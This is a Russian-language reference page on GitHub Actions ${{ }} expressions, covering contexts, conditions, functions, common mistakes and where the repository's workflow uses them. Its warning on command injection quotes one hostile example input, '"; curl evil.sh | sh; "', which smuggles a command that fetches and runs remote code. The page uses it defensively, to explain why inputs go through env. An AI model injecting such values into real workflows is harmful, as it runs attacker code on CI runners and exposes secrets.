# ${{ }} — выражения

```python
${{ inputs.branch_name }}   ${{ steps.name.outputs.branch }}
```

**Что это.** Подстановка значений из контекстов GitHub. Вычисляется ДО запуска шага.

**Зачем.** Только так workflow получает доступ к вводу пользователя, результатам предыдущих шагов, данным о коммите и секретам.

## Сигнатура

```python
${{ <контекст>.<поле> }}
${{ <выражение> }}
```

## Параметры

| Параметр | Тип | По умолчанию | Что делает |
|---|---|---|---|
| ``inputs`` | — | — | Значения формы `workflow_dispatch` |
| ``steps.<id>.outputs.<key>`` | — | — | Вывод предыдущего шага (шагу нужен `id`) |
| ``github`` | — | — | `github.actor`, `github.sha`, `github.ref`, `github.repository`, `github.event_name` |
| ``env`` | — | — | Переменные окружения |
| ``secrets`` | — | — | Секреты репозитория |
| ``matrix`` | — | — | Текущее значение матрицы |
| ``runner`` | — | — | `runner.os`, `runner.temp` |

## Минимальный пример

```python
- name: Create or update snapshot branch
  env:
    # Читаем имя ветки, вычисленное шагом с id: name
    BRANCH: ${{ steps.name.outputs.branch }}
  run: |
    echo "$BRANCH"
```

## Типичные задачи

**Условия**

```python
if: github.event_name == 'workflow_dispatch'
if: success() && github.ref == 'refs/heads/main'
if: always()          # выполнить даже после падения
```

**Функции**

```python
${{ contains(github.ref, 'release') }}
${{ startsWith(github.ref, 'refs/tags/') }}
${{ format('snapshot-{0}', github.run_number) }}
```

## Частые ошибки

- **Подстановка в тело `run` — инъекция команд.** `${{ }}` разворачивается ДО того, как скрипт попадёт в shell. Значение `"; curl evil.sh | sh; "` станет командой. Именно поэтому в этом workflow ввод идёт через `env`, а не напрямую в текст.
- **`${{ }}` в `if` уже подразумевается** — писать `if: ${{ x == 'y' }}` избыточно, достаточно `if: x == 'y'`.
- **Одинарные кавычки в выражениях.** Внутри `${{ }}` строки пишутся в одинарных кавычках; двойные — синтаксическая ошибка.

## Где в репозитории

- `.github/workflows/main.yml:58` — `BRANCH_NAME_INPUT: ${{ inputs.branch_name }}`
- `.github/workflows/main.yml:94` — `BRANCH: ${{ steps.name.outputs.branch }}`

## См. также

[env](env.md), [GITHUB_OUTPUT](GITHUB_OUTPUT.md), [workflow_dispatch](workflow_dispatch.md)
